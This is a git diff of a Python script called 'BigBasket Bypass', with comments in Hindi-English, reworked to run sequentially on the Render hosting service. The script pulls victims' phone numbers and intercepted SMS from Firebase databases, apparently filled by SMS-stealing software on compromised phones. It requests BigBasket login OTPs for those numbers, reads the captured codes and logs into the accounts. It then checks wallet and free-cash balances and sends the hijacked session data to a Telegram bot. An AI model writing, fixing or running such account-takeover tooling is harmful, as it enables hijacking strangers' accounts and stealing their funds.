@@ -1,16 +1,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                                                                          ║
-║   ████████╗██╗  ██╗███████╗    ██████╗  █████╗ ██████╗ ██╗  ██╗          ║
-║   ╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝          ║
-║      ██║   ███████║█████╗      ██║  ██║███████║██████╔╝█████╔╝           ║
-║      ██║   ██╔══██║██╔══╝      ██║  ██║██╔══██║██╔══██╗██╔═██╗           ║
-║      ██║   ██║  ██║███████╗    ██████╔╝██║  ██║██║  ██║██║  ██╗          ║
-║      ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝          ║
-║                                                                          ║
-║        BigBasket Bypass — 5 DEVICES × ALL PHONES PARALLEL                ║
-║                    (AUTO MODE — NO SELECTION)                            ║
+║   BigBasket Bypass — 5 DEVICES × PHONES (SEQUENTIAL PER DEVICE)          ║
+║   AUTO MODE — NO SELECTION — RENDER-SAFE (health check)                  ║
 ╚══════════════════════════════════════════════════════════════════════════╝
 """
 
@@ -21,10 +13,12 @@ import json
 import time
 import uuid
 import base64
+import signal
 import asyncio
 import logging
 import threading
-from collections import Counter
+import http.server
+import socketserver
 from datetime import datetime
 from typing import Optional, Dict, List, Set, Any, Tuple
 
@@ -56,7 +50,6 @@ class C:
     CYAN    = "\033[96m"
     WHITE   = "\033[97m"
     ORANGE  = "\033[38;5;208m"
-    PINK    = "\033[38;5;205m"
     GRAY    = "\033[38;5;245m"
 
     @staticmethod
@@ -85,6 +78,12 @@ def pad(s: str, w: int) -> str:
     return s + " " * max(0, w - _visible_len(s))
 
 
+def log(*args, **kwargs):
+    """Print with force flush (Render logs stream karne ke liye zaroori)."""
+    kwargs.setdefault("flush", True)
+    print(*args, **kwargs)
+
+
 # ============================================================
 # CONFIG
 # ============================================================
@@ -93,30 +92,61 @@ CHAT_ID = 8287613405
 
 FIREBASE_FILE = "firebase.txt"
 USED_FILE = "used.json"
-OTP_WAIT_SECONDS = 15
-FB_REQUEST_TIMEOUT = 5
-FB_RETRY_MAX = 10
-FB_RETRY_BACKOFF = 1.0
+
+OTP_WAIT_SECONDS        = 30       # ⬆ 15 → 30 (SMS delay handle)
+FB_REQUEST_TIMEOUT      = 6
+FB_RETRY_MAX            = 5
+FB_RETRY_BACKOFF        = 1.0
 FB_MESSAGES_PER_CLIENT_LIMIT = 150
-FB_CLIENTS_MAX_BYTES = 100 * 1024 * 1024
+FB_CLIENTS_MAX_BYTES    = 100 * 1024 * 1024
 
-FB_CONCURRENCY = 50
+FB_CONCURRENCY          = 25
+DEVICES_PARALLEL        = 2       # ⬇ 5 → 3 (Render safe)
+FB_SCAN_CONCURRENCY     = 20
 
-DEVICES_PARALLEL = 5
-PHONE_STAGGER = 1.0
-FB_SCAN_CONCURRENCY = 25
+MIN_BALANCE_TO_SEND     = 1
+AUTO_RERUN_DELAY        = 0        # 0 = single run
 
-MIN_BALANCE_TO_SEND = 1
+# Health check port (Render sets $PORT env)
+HEALTH_PORT = int(os.environ.get("PORT", 8080))
 
-# ⏱ Auto-loop: agar chaaho to loop chalata rahe (0 = ek baar)
-AUTO_RERUN_DELAY = 0   # seconds; 0 = single run only
-# ============================================================
 
 logging.basicConfig(
     level=logging.INFO,
-    format=f"{C.GRAY}%(asctime)s{C.RESET} | {C.CYAN}%(levelname)s{C.RESET} | %(message)s"
+    format="%(asctime)s | %(levelname)s | %(message)s",
+    force=True,
 )
 logger = logging.getLogger("DarkScript")
+
+
+# ============================================================
+# HEALTH CHECK SERVER (Render Web Service ke liye)
+# ============================================================
+class _HealthHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        try:
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.send_header("Content-Length", "2")
+            self.end_headers()
+            self.wfile.write(b"ok")
+        except Exception:
+            pass
+
+    def log_message(self, *args, **kwargs):
+        return  # silence
+
+
+def start_health_server():
+    try:
+        handler = _HealthHandler
+        httpd = socketserver.TCPServer(("0.0.0.0", HEALTH_PORT), handler)
+        httpd.allow_reuse_address = True
+        t = threading.Thread(target=httpd.serve_forever, daemon=True)
+        t.start()
+        print(f"[HEALTH] Listening on 0.0.0.0:{HEALTH_PORT}", flush=True)
+    except Exception as e:
+        print(f"[HEALTH] Failed: {e}", flush=True)
 
 
 # ============================================================
@@ -173,17 +203,12 @@ class UsedTracker:
             }
             self._save()
 
-    def reset(self):
-        with self._lock:
-            self.data = {}
-            self._save()
-
 
 USED = UsedTracker(USED_FILE)
 
 
 # ============================================================
-# PHONE PATTERNS
+# PHONE / OTP PATTERNS
 # ============================================================
 PHONE_PATTERNS = [
     re.compile(r'(?:Jio|JIO)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
@@ -554,7 +579,7 @@ def _fetch_current_otps(fb_url: str, client_id: str) -> Set[str]:
         resp = None
         for attempt in range(FB_RETRY_MAX + 1):
             try:
-                resp = session.get(url, timeout=4)
+                resp = session.get(url, timeout=5)
                 break
             except Exception:
                 if attempt < FB_RETRY_MAX:
@@ -579,25 +604,24 @@ def _fetch_current_otps(fb_url: str, client_id: str) -> Set[str]:
     return baseline
 
 
-def fetch_all_new_otps(fb_url: str, client_id: str, timeout: int,
-                       trigger_ms: int, baseline_otps: set,
-                       needed: int) -> List[str]:
-    start_time = time.time()
+def fetch_one_new_otp(fb_url: str, client_id: str, timeout: int,
+                      trigger_ms: int, baseline_otps: set) -> Optional[str]:
+    """Wait for ONE new OTP (used for sequential phone processing)."""
+    start = time.time()
     session = requests.Session()
     session.verify = False
     base_url = fb_url.rstrip('/')
 
-    last_count = 0
-    while time.time() - start_time < timeout:
+    while time.time() - start < timeout:
         try:
             url = f"{base_url}/messages/{client_id}.json"
-            resp = session.get(url, timeout=4)
+            resp = session.get(url, timeout=5)
             if resp.status_code != 200:
-                time.sleep(0.5)
+                time.sleep(0.6)
                 continue
             data = resp.json()
             if not data or not isinstance(data, dict):
-                time.sleep(0.5)
+                time.sleep(0.6)
                 continue
 
             found: List[Tuple[int, str]] = []
@@ -619,58 +643,16 @@ def fetch_all_new_otps(fb_url: str, client_id: str, timeout: int,
                     continue
                 found.append((ts, otp))
 
-            seen = {}
-            for ts, otp in sorted(found):
-                if otp not in seen:
-                    seen[otp] = ts
-            unique_otps = [otp for otp, _ in sorted(seen.items(), key=lambda x: x[1])]
-
-            if len(unique_otps) != last_count:
-                last_count = len(unique_otps)
-                logger.info(f"{C.GREEN}[OTP-BULK]{C.RESET} "
-                            f"{last_count}/{needed} new OTPs for {C.dev(client_id)}")
-
-            if len(unique_otps) >= needed:
-                elapsed = time.time() - start_time
-                logger.info(f"{C.GREEN}[OTP-BULK]{C.RESET} All {needed} received "
-                            f"for {C.dev(client_id)} in {elapsed:.1f}s")
-                return unique_otps[:needed]
+            if found:
+                found.sort()
+                # Newest OTP
+                return found[-1][1]
 
             time.sleep(0.5)
         except Exception:
-            time.sleep(0.5)
+            time.sleep(0.6)
 
-    logger.warning(f"{C.YELLOW}[OTP-BULK]{C.RESET} Timeout after {timeout}s — "
-                   f"got {last_count}/{needed} for {client_id}")
-    try:
-        url = f"{base_url}/messages/{client_id}.json"
-        resp = session.get(url, timeout=4)
-        if resp.status_code == 200:
-            data = resp.json()
-            if isinstance(data, dict):
-                found = []
-                for msg_id, msg in data.items():
-                    if not isinstance(msg, dict):
-                        continue
-                    try:
-                        ts = int(msg_id)
-                    except (ValueError, TypeError):
-                        continue
-                    if ts < (trigger_ms - 60000):
-                        continue
-                    text = str(msg.get('body') or msg.get('message')
-                               or msg.get('text') or msg.get('msg') or '')
-                    otp = _extract_otp_from_text(text)
-                    if otp and otp not in baseline_otps:
-                        found.append((ts, otp))
-                seen = {}
-                for ts, otp in sorted(found):
-                    if otp not in seen:
-                        seen[otp] = ts
-                return [otp for otp, _ in sorted(seen.items(), key=lambda x: x[1])]
-    except Exception:
-        pass
-    return []
+    return None
 
 
 # ============================================================
@@ -727,7 +709,7 @@ class BigBasketClient:
                 return r
             except Exception:
                 if attempt < FB_RETRY_MAX:
-                    time.sleep(0.8)
+                    time.sleep(0.6)
                     continue
                 return None
         return None
@@ -954,7 +936,7 @@ class BigBasketClient:
 
 
 # ============================================================
-# TELEGRAM SENDER — FILE + SHORT CAPTION
+# TELEGRAM SENDER
 # ============================================================
 def _build_clean_json(client: BigBasketClient) -> dict:
     return {
@@ -966,13 +948,8 @@ def _build_clean_json(client: BigBasketClient) -> dict:
 
 async def send_telegram_alert(fb_url, device_id, phone, client,
                               wallet, freecash, otp=""):
-    """
-    📎 Sirf JSON file bhejo + short caption
-    Caption format: OK | W=₹X F=₹Y T=₹Z →
-    """
     base = f"https://api.telegram.org/bot{BOT_TOKEN}"
     total = int(wallet) + int(freecash)
-
     try:
         async with aiohttp.ClientSession() as session:
             try:
@@ -996,30 +973,80 @@ async def send_telegram_alert(fb_url, device_id, phone, client,
                 )
             except Exception as e:
                 logger.error(f"sendDocument failed: {e}")
-        logger.info(f"{C.GREEN}[TG]{C.RESET} Sent JSON for {C.BOLD}{phone}{C.RESET} "
-                    f"| {C.money('₹'+str(total))}")
+        logger.info(f"[TG] Sent JSON for {phone} | ₹{total}")
     except Exception as e:
         logger.error(f"[TG] send failed: {e}")
 
 
 # ============================================================
-# PARALLEL DEVICE PROCESSING
+# SEQUENTIAL PHONE PROCESSING (per device — fixes OTP mismatch)
 # ============================================================
-async def _send_otp_for_phone(phone: str, delay: float,
-                               clients: Dict[str, BigBasketClient]) -> Tuple[str, bool]:
+async def _process_one_phone(device_id: str, phone: str, fb_url: str) -> dict:
+    """Process a single phone end-to-end: OTP send → wait → verify → balance."""
+    client = BigBasketClient()
     try:
-        if delay > 0:
-            await asyncio.sleep(delay)
-        c = BigBasketClient()
-        clients[phone] = c
-        await asyncio.to_thread(c.register_device)
-        await asyncio.to_thread(c.load_ui_data)
-        await asyncio.to_thread(c.update_device_info)
-        ok = await asyncio.to_thread(c.request_otp, phone)
-        return phone, bool(ok)
+        # fresh baseline
+        baseline = await asyncio.to_thread(_fetch_current_otps, fb_url, device_id)
+
+        # prepare session
+        await asyncio.to_thread(client.register_device)
+        await asyncio.to_thread(client.load_ui_data)
+        await asyncio.to_thread(client.update_device_info)
+
+        # request OTP
+        ok = await asyncio.to_thread(client.request_otp, phone)
+        if not ok:
+            log(f"   {C.err('❌ OTP failed')} → {phone} ({client.last_otp_error})")
+            return {"phone": phone, "device_id": device_id, "success": False,
+                    "error": f"OTP: {client.last_otp_error}"}
+        log(f"   {C.ok('✅ OTP sent')} → {C.BOLD}{phone}{C.RESET}")
+
+        trigger_ms = int(time.time() * 1000)
+        otp = await asyncio.to_thread(
+            fetch_one_new_otp, fb_url, device_id, OTP_WAIT_SECONDS,
+            trigger_ms, baseline)
+
+        if not otp:
+            log(f"   {C.err('✗ No OTP received')} → {phone}")
+            return {"phone": phone, "device_id": device_id, "success": False,
+                    "error": "no OTP received"}
+
+        log(f"   {C.info('🔐 Verifying')} {phone} {C.dim('with OTP')} {C.BOLD}{otp}{C.RESET}")
+        verified = await asyncio.to_thread(client.verify_otp, phone, otp)
+        if not verified:
+            log(f"   {C.err('✗ Verify failed')} → {phone} ({client.last_otp_error})")
+            return {"phone": phone, "device_id": device_id, "success": False,
+                    "error": f"Verify: {client.last_otp_error}"}
+
+        w = await asyncio.to_thread(client.get_wallet_details) or {}
+        f = await asyncio.to_thread(client.get_free_cash) or {}
+        wb = int(w.get("current_wallet_balance", 0) or 0)
+        fb = int(f.get("total_freecash_amount", 0) or 0)
+        total_cash = wb + fb
+
+        USED.mark_used(device_id, phone, wallet=wb, freecash=fb, fb_url=fb_url)
+
+        if total_cash >= MIN_BALANCE_TO_SEND:
+            log(f"   {C.ok('✅ OK')} {phone} | "
+                f"{C.money('₹'+str(wb))}+{C.money('₹'+str(fb))}"
+                f"={C.head('₹'+str(total_cash))} → {C.GREEN}TG{C.RESET}")
+            await send_telegram_alert(
+                fb_url=fb_url, device_id=device_id, phone=phone,
+                client=client, wallet=wb, freecash=fb, otp=otp)
+        else:
+            log(f"   {C.ok('✅ OK')} {phone} | {C.dim('₹0 balance → skip TG')}")
+
+        return {"phone": phone, "device_id": device_id, "success": True,
+                "wallet": wb, "freecash": fb, "total": total_cash, "otp": otp}
     except Exception as e:
-        logger.error(f"send_otp_for_phone {phone}: {e}")
-        return phone, False
+        log(f"   {C.err('✗ Error')} {phone}: {e}")
+        return {"phone": phone, "device_id": device_id,
+                "success": False, "error": str(e)[:120]}
+    finally:
+        try:
+            client.session.close()
+        except Exception:
+            pass
 
 
 async def process_device_all_phones(device_id: str, device_info: dict,
@@ -1029,123 +1056,26 @@ async def process_device_all_phones(device_id: str, device_info: dict,
     skipped = [p for p in phones_all if USED.is_used(device_id, p)]
     name = device_info.get("name", device_id[:12])
 
-    print(f"\n{C.head('━' * 78)}")
-    print(f"{C.head(f'📱 DEVICE {dev_idx}/{dev_total}')} {C.dev(name)} "
-          f"→ {C.BOLD}{len(phones_all)}{C.RESET} {C.info('phone(s)')}")
+    log(f"\n{C.head('━' * 78)}")
+    log(f"{C.head(f'📱 DEVICE {dev_idx}/{dev_total}')} {C.dev(name)} "
+        f"→ {C.BOLD}{len(phones_all)}{C.RESET} {C.info('phone(s)')}")
     if skipped:
-        print(f"   {C.dim(f'⏭ already used: {len(skipped)}')}")
+        log(f"   {C.dim(f'⏭ already used: {len(skipped)}')}")
     if fresh:
-        print(f"   {C.YELLOW}fresh: {', '.join(fresh)}{C.RESET}")
-    print(C.head('━' * 78))
+        log(f"   {C.YELLOW}fresh (sequential): {', '.join(fresh)}{C.RESET}")
+    log(C.head('━' * 78))
 
     if not fresh:
-        print(f"{C.dim('   All phones already used, skipping device.')}")
+        log(f"{C.dim('   All phones already used, skipping device.')}")
         return []
 
-    baseline = await asyncio.to_thread(_fetch_current_otps, fb_url, device_id)
-    trigger_ms = int(time.time() * 1000)
+    results = []
+    for i, phone in enumerate(fresh, 1):
+        log(f"\n   {C.info(f'▶ Phone {i}/{len(fresh)}')} {C.BOLD}{phone}{C.RESET}")
+        r = await _process_one_phone(device_id, phone, fb_url)
+        results.append(r)
 
-    clients: Dict[str, BigBasketClient] = {}
-    print(f"   {C.info('📤 Sending OTPs to')} {C.BOLD}{len(fresh)}{C.RESET} "
-          f"{C.info('phone(s) in parallel...')}")
-    send_tasks = [
-        asyncio.create_task(_send_otp_for_phone(p, i * PHONE_STAGGER, clients))
-        for i, p in enumerate(fresh)
-    ]
-    send_results = await asyncio.gather(*send_tasks, return_exceptions=True)
-
-    sent_phones: List[str] = []
-    for r in send_results:
-        if isinstance(r, Exception):
-            continue
-        phone, ok = r
-        if ok:
-            sent_phones.append(phone)
-            print(f"   {C.ok('✅ OTP sent')} → {C.BOLD}{phone}{C.RESET}")
-        else:
-            c = clients.get(phone)
-            err = c.last_otp_error if c else "?"
-            print(f"   {C.err('❌ OTP failed')} → {phone} ({err})")
-
-    if not sent_phones:
-        for c in clients.values():
-            try: c.session.close()
-            except Exception: pass
-        return []
-
-    print(f"   {C.warn(f'⏳ Waiting for {len(sent_phones)} OTP(s) in firebase...')}")
-    new_otps = await asyncio.to_thread(
-        fetch_all_new_otps, fb_url, device_id, OTP_WAIT_SECONDS,
-        trigger_ms, baseline, len(sent_phones))
-
-    print(f"   {C.info(f'📥 Received {len(new_otps)}/{len(sent_phones)} OTP(s)')}")
-
-    phone_otp: Dict[str, str] = {}
-    for i, phone in enumerate(sent_phones):
-        if i < len(new_otps):
-            phone_otp[phone] = new_otps[i]
-
-    async def finalize(phone: str) -> dict:
-        client = clients.get(phone)
-        otp = phone_otp.get(phone)
-        if not client:
-            return {"phone": phone, "device_id": device_id,
-                    "success": False, "error": "no client"}
-        if not otp:
-            try: client.session.close()
-            except Exception: pass
-            print(f"   {C.err('✗ No OTP matched')} → {phone}")
-            return {"phone": phone, "device_id": device_id,
-                    "success": False, "error": "no OTP matched"}
-        try:
-            print(f"   {C.info('🔐 Verifying')} {phone} {C.dim('with OTP')} {C.BOLD}{otp}{C.RESET}")
-            verified = await asyncio.to_thread(client.verify_otp, phone, otp)
-            if not verified:
-                print(f"   {C.err('✗ Verify failed')} → {phone} ({client.last_otp_error})")
-                return {"phone": phone, "device_id": device_id,
-                        "success": False, "error": f"Verify: {client.last_otp_error}"}
-
-            w = await asyncio.to_thread(client.get_wallet_details) or {}
-            f = await asyncio.to_thread(client.get_free_cash) or {}
-            wb = int(w.get("current_wallet_balance", 0) or 0)
-            fb = int(f.get("total_freecash_amount", 0) or 0)
-            total_cash = wb + fb
-
-            USED.mark_used(device_id, phone, wallet=wb, freecash=fb, fb_url=fb_url)
-
-            if total_cash >= MIN_BALANCE_TO_SEND:
-                print(f"   {C.ok('✅ OK')} {phone} | "
-                      f"{C.money('₹'+str(wb))}+{C.money('₹'+str(fb))}"
-                      f"={C.head('₹'+str(total_cash))} → {C.GREEN}TG{C.RESET}")
-                await send_telegram_alert(
-                    fb_url=fb_url, device_id=device_id, phone=phone,
-                    client=client, wallet=wb, freecash=fb, otp=otp)
-            else:
-                print(f"   {C.ok('✅ OK')} {phone} | "
-                      f"{C.dim('₹0 balance → skip TG')} "
-                      f"{C.dim('| saved')}")
-
-            return {"phone": phone, "device_id": device_id,
-                    "success": True, "wallet": wb, "freecash": fb,
-                    "total": total_cash, "otp": otp}
-        except Exception as e:
-            print(f"   {C.err('✗ Error')} {phone}: {e}")
-            return {"phone": phone, "device_id": device_id,
-                    "success": False, "error": str(e)[:120]}
-        finally:
-            try: client.session.close()
-            except Exception: pass
-
-    finalize_tasks = [asyncio.create_task(finalize(p)) for p in sent_phones]
-    results = await asyncio.gather(*finalize_tasks, return_exceptions=True)
-    out = [r for r in results if isinstance(r, dict)]
-
-    for p, c in clients.items():
-        if p not in sent_phones:
-            try: c.session.close()
-            except Exception: pass
-
-    return out
+    return results
 
 
 async def _process_devices_in_batches(devices_list: List[Tuple[str, dict]],
@@ -1156,11 +1086,10 @@ async def _process_devices_in_batches(devices_list: List[Tuple[str, dict]],
     for batch_start in range(0, total_devices, DEVICES_PARALLEL):
         batch = devices_list[batch_start:batch_start + DEVICES_PARALLEL]
         batch_end = batch_start + len(batch)
-        print(f"\n{C.head('🔥' * 30)}")
-        print(f"{C.head(f'BATCH {batch_start+1}-{batch_end}/{total_devices}')} "
-              f"{C.dim('→ processing')} {C.BOLD}{len(batch)}{C.RESET} "
-              f"{C.dim('devices in parallel')}")
-        print(f"{C.head('🔥' * 30)}")
+        log(f"\n{C.head('🔥' * 30)}")
+        log(f"{C.head(f'BATCH {batch_start+1}-{batch_end}/{total_devices}')} "
+            f"{C.dim('→')} {C.BOLD}{len(batch)}{C.RESET} {C.dim('devices parallel')}")
+        log(f"{C.head('🔥' * 30)}")
 
         tasks = []
         for i, (did, dinfo) in enumerate(batch):
@@ -1186,19 +1115,10 @@ async def _process_devices_in_batches(devices_list: List[Tuple[str, dict]],
 def print_banner():
     banner = r"""
 ╔══════════════════════════════════════════════════════════════════════════╗
-║                                                                          ║
-║   ████████╗██╗  ██╗███████╗    ██████╗  █████╗ ██████╗ ██╗  ██╗          ║
-║   ╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝          ║
-║      ██║   ███████║█████╗      ██║  ██║███████║██████╔╝█████╔╝           ║
-║      ██║   ██╔══██║██╔══╝      ██║  ██║██╔══██║██╔══██╗██╔═██╗           ║
-║      ██║   ██║  ██║███████╗    ██████╔╝██║  ██║██║  ██║██║  ██╗          ║
-║      ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝          ║
-║                                                                          ║
-║        BigBasket Bypass — 5 DEVICES × ALL PHONES PARALLEL                ║
-║                    (AUTO MODE — NO SELECTION)                            ║
+║   BigBasket Bypass — AUTO MODE — RENDER-SAFE                             ║
 ╚══════════════════════════════════════════════════════════════════════════╝
 """
-    print(f"{C.MAGENTA}{C.BOLD}{banner}{C.RESET}")
+    log(f"{C.MAGENTA}{C.BOLD}{banner}{C.RESET}")
 
 
 def _fmt_scan_row(idx, url, s):
@@ -1223,10 +1143,10 @@ def _fmt_scan_row(idx, url, s):
 
 
 async def scan_all_streaming(urls: List[str]) -> List[Any]:
-    print("\n" + C.head("=" * 100))
-    print(f"{C.BOLD}{'#':<4} {'FIREBASE URL':<58} "
-          f"{'ONLINE':<12} {'OFFLINE':<12} {'TOTAL':<10} STATUS{C.RESET}")
-    print(C.head("=" * 100))
+    log("\n" + C.head("=" * 100))
+    log(f"{C.BOLD}{'#':<4} {'FIREBASE URL':<58} "
+        f"{'ONLINE':<12} {'OFFLINE':<12} {'TOTAL':<10} STATUS{C.RESET}")
+    log(C.head("=" * 100))
 
     results: List[Any] = [None] * len(urls)
     sem = asyncio.Semaphore(FB_SCAN_CONCURRENCY)
@@ -1247,20 +1167,20 @@ async def scan_all_streaming(urls: List[str]) -> List[Any]:
         idx, r = await task
         results[idx] = r
         completed += 1
-        print(_fmt_scan_row(idx + 1, urls[idx], r), flush=True)
+        log(_fmt_scan_row(idx + 1, urls[idx], r))
 
-    print(C.head("=" * 100))
-    print(f"{C.dim(f'⚡ Scanned {completed} firebase(s) in {time.time()-t0:.2f}s')}")
+    log(C.head("=" * 100))
+    log(f"{C.dim(f'⚡ Scanned {completed} firebase(s) in {time.time()-t0:.2f}s')}")
     return results
 
 
 async def process_firebase(fb_url, tag_label: str = ""):
     label = f"{C.dev(fb_url)}" if not tag_label else f"{C.YELLOW}[{tag_label}]{C.RESET} {C.dev(fb_url)}"
-    print(f"\n{C.info('🔎 Fetching online devices + all phones from')} {label}...")
+    log(f"\n{C.info('🔎 Fetching online devices + all phones from')} {label}...")
     t0 = time.time()
     online = await get_online_devices(fb_url)
     if not online:
-        print(C.err("❌ No online devices found."))
+        log(C.err("❌ No online devices found."))
         return
 
     devices_with_phones = {cid: i for cid, i in online.items() if i.get("phones")}
@@ -1275,41 +1195,26 @@ async def process_firebase(fb_url, tag_label: str = ""):
             else:
                 fresh_count += 1
 
-    print(f"\n{C.head('📊 Scan result:')} {C.dim(f'({time.time()-t0:.2f}s)')}")
-    print(f"   {C.info('Online devices   :')} {C.BOLD}{len(online)}{C.RESET}")
-    print(f"   {C.ok('✅ With phones    :')} {C.BOLD}{len(devices_with_phones)}{C.RESET}")
-    print(f"   {C.head('📱 Total phones   :')} {C.BOLD}{total_phones}{C.RESET}")
-    print(f"   {C.ok('🆕 Fresh phones   :')} {C.BOLD}{fresh_count}{C.RESET}")
-    print(f"   {C.dim('⏭ Already used   :')} {C.BOLD}{used_count}{C.RESET}")
-    print(f"   {C.dim('📁 used.json      :')} {C.BOLD}{USED.count()}{C.RESET} {C.dim('total records')}")
+    log(f"\n{C.head('📊 Scan result:')} {C.dim(f'({time.time()-t0:.2f}s)')}")
+    log(f"   {C.info('Online devices   :')} {C.BOLD}{len(online)}{C.RESET}")
+    log(f"   {C.ok('✅ With phones    :')} {C.BOLD}{len(devices_with_phones)}{C.RESET}")
+    log(f"   {C.head('📱 Total phones   :')} {C.BOLD}{total_phones}{C.RESET}")
+    log(f"   {C.ok('🆕 Fresh phones   :')} {C.BOLD}{fresh_count}{C.RESET}")
+    log(f"   {C.dim('⏭ Already used   :')} {C.BOLD}{used_count}{C.RESET}")
+    log(f"   {C.dim('📁 used.json      :')} {C.BOLD}{USED.count()}{C.RESET}")
 
     if not devices_with_phones:
-        print(C.err("\n❌ No devices have phone numbers. Nothing to process."))
+        log(C.err("\n❌ No devices have phone numbers."))
         return
-
-    print(f"\n{C.head('📋 Phone breakdown per device:')}")
-    for cid, info in devices_with_phones.items():
-        name = info["name"][:30]
-        phones = info["phones"]
-        tags = []
-        for p in phones:
-            if USED.is_used(cid, p):
-                tags.append(f"{C.dim(p)}")
-            else:
-                tags.append(f"{C.YELLOW}{p}{C.RESET}")
-        print(f"   {C.dev(name):<32} → {', '.join(tags)}")
 
     if fresh_count == 0:
-        print(C.err("\n❌ All phones in this firebase are already used."))
+        log(C.err("\n❌ All phones already used."))
         return
 
-    print(f"\n{C.head(f'🚀 Starting bypass for {fresh_count} fresh phone(s)...')}")
-    print(f"{C.warn(f'⏱  OTP wait: {OTP_WAIT_SECONDS}s | Stagger: {PHONE_STAGGER}s')}")
-    print(f"{C.info(f'⚡ DEVICES PARALLEL: {DEVICES_PARALLEL} (all phones of a device in parallel)')}")
-    print(f"{C.info(f'💸 Telegram threshold: ₹{MIN_BALANCE_TO_SEND}+ only')}")
-    print(f"{C.info(f'📎 Telegram: FILE + caption (OK | W=₹ F=₹ T=₹ →)')}")
-    print(f"{C.info(f'💾 Used tracker: {USED_FILE}')}")
-    print(C.dim("-" * 78))
+    log(f"\n{C.head(f'🚀 Starting bypass for {fresh_count} fresh phone(s)...')}")
+    log(f"{C.warn(f'⏱  OTP wait: {OTP_WAIT_SECONDS}s | DEVICES_PARALLEL: {DEVICES_PARALLEL}')}")
+    log(f"{C.info(f'🔁 Phones processed SEQUENTIALLY per device (fixes OTP mismatch)')}")
+    log(C.dim("-" * 78))
 
     devices_list = list(devices_with_phones.items())
     t_start = time.time()
@@ -1317,13 +1222,10 @@ async def process_firebase(fb_url, tag_label: str = ""):
 
     success = 0
     failed = 0
-    skipped = 0
     total_cash = 0
     sent_count = 0
     for r in results:
-        if r and r.get("skipped"):
-            skipped += 1
-        elif r and r.get("success"):
+        if r and r.get("success"):
             success += 1
             t = r.get("total", 0)
             total_cash += t
@@ -1333,46 +1235,36 @@ async def process_firebase(fb_url, tag_label: str = ""):
             failed += 1
 
     elapsed = time.time() - t_start
-    print("\n" + C.head("=" * 78))
-    print(C.head(C.BOLD + "🏁 PROCESS COMPLETE" + C.RESET))
-    print(C.head("=" * 78))
-    print(f"   {C.info('Devices       :')} {C.BOLD}{len(devices_list)}{C.RESET}")
-    print(f"   {C.info('Processed     :')} {C.BOLD}{len(results)}{C.RESET}")
-    print(f"   {C.ok('✅ Success    :')} {C.BOLD}{success}{C.RESET}")
-    print(f"   {C.err('❌ Failed     :')} {C.BOLD}{failed}{C.RESET}")
-    print(f"   {C.dim('⏭ Skipped     :')} {C.BOLD}{skipped}{C.RESET} {C.dim('(already used)')}")
-    print(f"   {C.head('📤 Sent to TG :')} {C.BOLD}{sent_count}{C.RESET}")
-    print(f"   {C.head('💰 Total Cash :')} {C.money('₹'+str(total_cash))}")
-    print(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET} {C.dim('total records')}")
-    print(f"   {C.dim('⏱  Elapsed    :')} {C.dim(f'{elapsed:.2f}s')}")
-    print(C.head("=" * 78))
+    log("\n" + C.head("=" * 78))
+    log(C.head(C.BOLD + "🏁 PROCESS COMPLETE" + C.RESET))
+    log(C.head("=" * 78))
+    log(f"   {C.ok('✅ Success    :')} {C.BOLD}{success}{C.RESET}")
+    log(f"   {C.err('❌ Failed     :')} {C.BOLD}{failed}{C.RESET}")
+    log(f"   {C.head('📤 Sent to TG :')} {C.BOLD}{sent_count}{C.RESET}")
+    log(f"   {C.head('💰 Total Cash :')} {C.money('₹'+str(total_cash))}")
+    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
+    log(f"   {C.dim('⏱  Elapsed    :')} {C.dim(f'{elapsed:.2f}s')}")
+    log(C.head("=" * 78))
 
 
 async def process_multiple_firebases(chosen_urls: List[str]):
     t_all = time.time()
-
     for i, u in enumerate(chosen_urls, 1):
-        print("\n" + C.head("━" * 78))
-        print(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{len(chosen_urls)}' + C.RESET)}")
-        print(C.head("━" * 78))
+        log("\n" + C.head("━" * 78))
+        log(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{len(chosen_urls)}' + C.RESET)}")
+        log(C.head("━" * 78))
         await process_firebase(u, tag_label=f"{i}/{len(chosen_urls)}")
-
-    print("\n" + C.head("█" * 78))
-    print(C.head(C.BOLD + f"🏆 GRAND TOTAL — {len(chosen_urls)} FIREBASE(S)" + C.RESET))
-    print(C.head("█" * 78))
-    print(f"   {C.dim('⏱  Total time :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
-    print(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET} {C.dim('records total')}")
-    print(C.head("█" * 78))
+    log("\n" + C.head("█" * 78))
+    log(C.head(C.BOLD + f"🏆 GRAND TOTAL — {len(chosen_urls)} FIREBASE(S)" + C.RESET))
+    log(C.head("█" * 78))
+    log(f"   {C.dim('⏱  Total time :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
+    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
 
 
-# ============================================================
-# AUTO-RUN (NO SELECTION)
-# ============================================================
 async def auto_run_once():
     urls = load_firebase_urls()
     if not urls:
-        print(C.err(f"\n❌ No firebase URLs found in '{FIREBASE_FILE}'"))
-        print(C.warn(f"   Create '{FIREBASE_FILE}' and add one URL per line."))
+        log(C.err(f"\n❌ No firebase URLs found in '{FIREBASE_FILE}'"))
         return False
 
     normalized = []
@@ -1381,58 +1273,61 @@ async def auto_run_once():
         if n:
             normalized.append(n)
         else:
-            print(C.warn(f"⚠️  Invalid firebase URL skipped: {u}"))
+            log(C.warn(f"⚠️  Invalid firebase URL skipped: {u}"))
     urls = normalized
     if not urls:
-        print(C.err("❌ No valid firebase URLs."))
+        log(C.err("❌ No valid firebase URLs."))
         return False
 
